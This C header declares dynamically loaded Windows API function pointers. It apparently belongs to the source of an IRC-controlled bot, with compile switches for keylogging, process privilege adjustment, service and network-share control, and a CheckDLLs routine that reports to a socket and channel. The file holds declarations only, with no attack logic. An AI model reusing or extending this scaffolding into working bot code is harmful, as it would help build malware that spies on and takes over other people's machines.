// kernel32.dll function variables
typedef UINT (__stdcall *SEM)(UINT);
typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (__stdcall *M32F)(HANDLE,LPMODULEENTRY32);
typedef BOOL (__stdcall *GDFSE)(LPCTSTR,PULARGE_INTEGER,PULARGE_INTEGER,PULARGE_INTEGER);
typedef DWORD (__stdcall *GLDS)(DWORD,LPTSTR);
typedef UINT (__stdcall *GDT)(LPCTSTR);
typedef DWORD (__stdcall *SP)(LPCTSTR,LPCTSTR,LPCTSTR,DWORD,LPTSTR,LPTSTR *);
typedef BOOL (__stdcall *QPC)(LARGE_INTEGER *);
typedef BOOL (__stdcall *QPF)(LARGE_INTEGER *);
typedef DWORD (__stdcall *RSP)(DWORD,DWORD);
typedef BOOL (__stdcall *GUPD)(HANDLE,LPTSTR,LPDWORD);

// user32.dll function variables
typedef LRESULT (__stdcall *SM)(HWND,UINT,WPARAM,LPARAM);
typedef HWND (__stdcall *FW)(LPCTSTR,LPCTSTR);
typedef BOOL (__stdcall *IW)(HWND);
typedef BOOL (__stdcall *DW)(HWND);
typedef BOOL (__stdcall *OC)(HWND);
typedef HANDLE (__stdcall *GCD)(UINT);
typedef BOOL (__stdcall *CC)(VOID);
typedef BOOL (__stdcall *EWE)(UINT,DWORD);
#ifndef NO_KEYLOG
typedef SHORT (__stdcall *GAKS)(int);
typedef SHORT (__stdcall *GKS)(int);
typedef int (__stdcall *GWT)(HWND,LPTSTR,int);
typedef HWND (__stdcall *GFW)(VOID);
#endif


// advapi32.dll function variables
typedef LONG (__stdcall *ROKE)(HKEY,LPCTSTR,DWORD,REGSAM,PHKEY);
typedef LONG (__stdcall *RCKE)(HKEY,LPCTSTR,DWORD,LPTSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
typedef LONG (__stdcall *RSVE)(HKEY,LPCTSTR,DWORD,DWORD,const BYTE *,DWORD);
typedef LONG (__stdcall *RQVE)(HKEY,LPCTSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD);
typedef LONG (__stdcall *RDV)(HKEY,LPCTSTR);
typedef LONG (__stdcall *RCK)(HKEY);
#ifndef NO_PROCESS
typedef BOOL (__stdcall *OPT)(HANDLE,DWORD,PHANDLE);
typedef BOOL (__stdcall *LPV)(LPCTSTR,LPCTSTR,PLUID);
typedef BOOL (__stdcall *ATP)(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
#endif
#ifndef NO_NET
typedef SC_HANDLE (__stdcall *OSCM)(LPCTSTR,LPCTSTR,DWORD);
typedef SC_HANDLE (__stdcall *OS)(SC_HANDLE,LPCTSTR,DWORD);
typedef BOOL (__stdcall *SS)(SC_HANDLE,DWORD,LPCTSTR *);
typedef BOOL (__stdcall *CS)(SC_HANDLE,DWORD,LPSERVICE_STATUS);
typedef BOOL (__stdcall *DS)(SC_HANDLE);
typedef BOOL (__stdcall *CSH)(SC_HANDLE);
typedef BOOL (__stdcall *ESS)(SC_HANDLE,DWORD,DWORD,LPENUM_SERVICE_STATUS,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef BOOL (__stdcall *IVSD)(PSECURITY_DESCRIPTOR);
#endif 
#ifndef NO_SYSINFO
typedef BOOL (__stdcall *GUN)(LPTSTR,LPDWORD);
#endif

// gdi32.dll function variables
typedef HDC (__stdcall *CDC)(LPCTSTR,LPCTSTR,LPCTSTR,CONST DEVMODE *);
typedef HBITMAP (__stdcall *CDIBS)(HDC,CONST BITMAPINFO *,UINT,VOID **,HANDLE,DWORD);
typedef HDC (__stdcall *CCDC)(HDC);
typedef int (__stdcall *GDC)(HDC,int);
typedef UINT (__stdcall *GDIBCT)(HDC,UINT,UINT,RGBQUAD *);
typedef HGDIOBJ (__stdcall *SO)(HDC,HGDIOBJ);
typedef BOOL (__stdcall *BB)(HDC,int,int,int,int,HDC,int,int,DWORD);
typedef BOOL (__stdcall *DDC)(HDC);
typedef BOOL (__stdcall *DO)(HGDIOBJ);

// ws2_32.dll function variables
typedef int (__stdcall *WSAS)(WORD,LPWSADATA);
typedef SOCKET (__stdcall *WSASo)(int,int,int,LPWSAPROTOCOL_INFO,GROUP,DWORD);
typedef int (__stdcall *WSAAS)(SOCKET,HWND hWnd,unsigned int,long);
typedef int (__stdcall *WSAFDIS)(SOCKET,fd_set *);
typedef int (__stdcall *WSAI)(SOCKET,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPWSAOVERLAPPED,LPWSAOVERLAPPED_COMPLETION_ROUTINE);
typedef int (__stdcall *WSAGLE)(void);
typedef int (__stdcall *WSAC)(void);
typedef SOCKET (__stdcall *SOCK)(int,int,int);
typedef int (__stdcall *IOCTLS)(SOCKET,long cmd,u_long *);
typedef int (__stdcall *CON)(SOCKET,const struct sockaddr *,int);
typedef char * FAR (__stdcall *INTOA)(struct in_addr);
typedef unsigned long (__stdcall *IADDR)(const char *);
typedef u_short (__stdcall *HTONS)(u_short);
typedef u_long (__stdcall *HTONL)(u_long);
typedef u_short (__stdcall *NTOHS)(u_short);
typedef u_long (__stdcall *NTOHL)(u_long);
typedef int (__stdcall *SEND)(SOCKET,const char *,int,int);
typedef int (__stdcall *SENDTO)(SOCKET,const char *,int,int,const struct sockaddr *,int);
typedef int (__stdcall *RECV)(SOCKET,char *,int,int);
typedef int (__stdcall *RECVFROM)(SOCKET,char *,int,int,struct sockaddr *,int *);
typedef int (__stdcall *BIND)(SOCKET,const struct sockaddr *,int);
typedef int (__stdcall *SEL)(int,fd_set *,fd_set *,fd_set *,const struct timeval *);
typedef int (__stdcall *LIS)(SOCKET,int);
typedef SOCKET (__stdcall *ACC)(SOCKET,struct sockaddr *,int *);
typedef int (__stdcall *SSO)(SOCKET,int,int,const char *,int);
typedef int (__stdcall *GSN)(SOCKET,struct sockaddr *,int *);
typedef int (__stdcall *GHN)(char *,int);
typedef struct hostent* FAR (__stdcall *GHBN)(const char *);
typedef struct hostent* FAR (__stdcall *GHBA)(const char *,int,int);
typedef int (__stdcall *GPN)(SOCKET,struct sockaddr*,int*);
typedef int (__stdcall *CLSO)(SOCKET);

// wininet.dll function variables
typedef BOOL (__stdcall *IGCSE)(LPDWORD,LPTSTR,DWORD,DWORD);
typedef BOOL (__stdcall *IGCS)(LPDWORD,DWORD);
typedef HINTERNET (__stdcall *HOR)(HINTERNET,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR *,DWORD,PDWORD);
typedef BOOL (__stdcall *HSR)(HINTERNET,LPCTSTR,DWORD,LPVOID,DWORD);
typedef HINTERNET (__stdcall *IC)(HINTERNET,LPCTSTR,INTERNET_PORT,LPCTSTR,LPCTSTR,DWORD,DWORD,PDWORD);
typedef HINTERNET (__stdcall *IO)(LPCTSTR,DWORD,LPCTSTR,LPCTSTR,DWORD);
typedef HINTERNET (__stdcall *IOU)(HINTERNET,LPCTSTR,LPCTSTR,DWORD,DWORD,PDWORD);
typedef BOOL (__stdcall *ICU)(LPCTSTR,DWORD,DWORD,LPURL_COMPONENTS);
typedef BOOL (__stdcall *IRF)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL (__stdcall *ICH)(HINTERNET);

// icmp.dll function variables
#ifndef NO_PING
typedef HANDLE (__stdcall *ICF)(VOID);
typedef DWORD (__stdcall *ISE)(HANDLE,IPAddr,LPVOID,WORD,PIP_OPTION_INFORMATION,LPVOID,DWORD,DWORD);
typedef BOOL (__stdcall *ICH)(HANDLE);
#endif

// netapi32.dll function variables
typedef NET_API_STATUS (__stdcall *NSA)(LPWSTR,DWORD,LPBYTE,LPDWORD);
typedef NET_API_STATUS (__stdcall *NSD)(LPWSTR,LPWSTR,DWORD);
typedef NET_API_STATUS (__stdcall *NSE)(LPWSTR,DWORD,LPBYTE *,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef NET_API_STATUS (__stdcall *NSJA)(LPCWSTR,LPBYTE,LPDWORD);
typedef NET_API_STATUS (__stdcall *NABF)(LPVOID);
typedef NET_API_STATUS (__stdcall *NRTOD)(LPCWSTR,LPBYTE *);
typedef NET_API_STATUS (__stdcall *NUA)(LPCWSTR,DWORD,LPBYTE,LPDWORD);
typedef NET_API_STATUS (__stdcall *NUD)(LPCWSTR,LPCWSTR);
typedef NET_API_STATUS (__stdcall *NUE)(LPCWSTR,DWORD,DWORD,LPBYTE *,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef NET_API_STATUS (__stdcall *NUGI)(LPCWSTR,LPCWSTR,DWORD,LPBYTE *);
typedef NET_API_STATUS (__stdcall *NMBS)(LPCWSTR,LPCWSTR,LPCWSTR,LPBYTE,DWORD);

// dnsapi.dll function variables
typedef BOOL (__stdcall *DFRC)(void);
typedef DNS_STATUS (__stdcall *DFRCEA)(LPCSTR);

// iphlpapi.dll function variables
typedef DWORD (__stdcall *GINT)(PMIB_IPNETTABLE,PULONG,BOOL);
typedef DWORD (__stdcall *DINE)(PMIB_IPNETROW);

// mpr.dll function variables
typedef DWORD (__stdcall *WNAC2)(LPNETRESOURCE,LPCTSTR,LPCTSTR,DWORD);
typedef DWORD (__stdcall *WNAC2W)(LPNETRESOURCEW,LPCWSTR,LPCWSTR,DWORD);
typedef DWORD (__stdcall *WNCC2)(LPCTSTR,DWORD,BOOL);
typedef DWORD (__stdcall *WNCC2W)(LPCWSTR,DWORD,BOOL);

// shell32.dll function variables
typedef HINSTANCE (__stdcall *SE)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT);
typedef void (__stdcall *SHCN)(LONG,UINT,LPCVOID,LPCVOID);

// odbc32.dll function variables
typedef SQLRETURN (__stdcall *SQLDC)(SQLHDBC,SQLHWND,SQLCHAR *,SQLSMALLINT,SQLCHAR *,SQLSMALLINT,SQLSMALLINT *,SQLUSMALLINT);
typedef SQLRETURN (__stdcall *SQLSEA)(SQLHENV,SQLINTEGER,SQLPOINTER,SQLINTEGER);
typedef SQLRETURN (__stdcall *SQLED)(SQLHSTMT,SQLCHAR *,SQLINTEGER);
typedef SQLRETURN (__stdcall *SQLAH)(SQLSMALLINT,SQLHANDLE,SQLHANDLE *);
typedef SQLRETURN (__stdcall *SQLFH)(SQLSMALLINT,SQLHANDLE);
typedef SQLRETURN (__stdcall *SQLD)(SQLHDBC);


BOOL LoadDLLs(void);
void CheckDLLs(SOCKET sock, char *chan, BOOL notice, BOOL silent);
